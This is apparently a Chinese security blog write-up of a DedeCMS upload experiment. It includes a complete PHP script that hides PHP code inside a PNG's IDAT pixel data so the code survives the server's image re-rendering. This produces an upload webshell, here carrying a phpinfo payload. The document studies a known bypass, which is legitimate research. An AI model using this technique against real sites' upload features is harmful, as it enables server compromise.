ailx10说：这篇是2024年8月之前写的，后来又改过。这里又收录了织梦那次 PNG 上传实验。最费心的不是点后台，而是先把内容放进能经受图像处理的像素和 IDAT 结构，再观察后缀变化后会不会被解释。这份记录和前面的同文对应的是同一段经历，不是又挖到一种新方法。保留它主要为了对上原书条目，也方便回看那段图片生成代码；从原文件到二次渲染、再到服务器解析，每一步都改变了数据，正是这些变化让一个看似普通的上传过程值得拆开研究。

---

（1）管理员登录，进入会员中心，发表文章，点击上传图片

![](/notes-assets/57163cdeb5ee826177a2.webp)

（2）上传图片马，由于网站会对图片进行处理，普通的图片马是无效的，因为会被二次渲染，破坏了里面的 php 代码，这里运行脚本，将 php 代码插入到 png 图片的 IDAT 数据块，生成对抗式图片马，载荷是`<?php phpinfo();?>`

```
<?php 
/* cX<?PHP 不可取消 但可以替换为c<?=
   ?>X<0x00><0x00> 不可删除。*/
$a='cX<?PHP PHPINFO();?>X'.urldecode('%00').urldecode('%00');

$payload_ascii='';
for($i=0;$i<strlen($a);$i++){
    $payload_ascii.=bin2hex($a[$i]);
}

$payload_hex=bin2hex(gzinflate(hex2bin($payload_ascii)));

// echo $payload_hex."
";
preg_match_all('/[a-z0-9]{2}/', $payload_hex, $matches);

$blist=[];

foreach($matches[0] as $key => $value){
    $blist[$key]=base_convert($value, 16, 10);
}

function filter1($blist){
    for($i=0; $i<(count($blist)-3);$i++){
        $blist[$i+3] = ($blist[$i+3] + $blist[$i]) %256;
    }
    return array_values($blist);
}

function filter3($blist){
    for($i=0; $i<(count($blist)-3);$i++){
        $blist[$i+3] = ($blist[$i+3] + floor($blist[$i]/2) ) %256;
    }
    return array_values($blist);
}
$p=array_merge(filter1($blist), filter3($blist));
$img = imagecreatetruecolor(32, 32);

// echo sizeof($p);
for ($y = 0; $y < sizeof($p)-3; $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   // echo $color;
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./2.png');
```
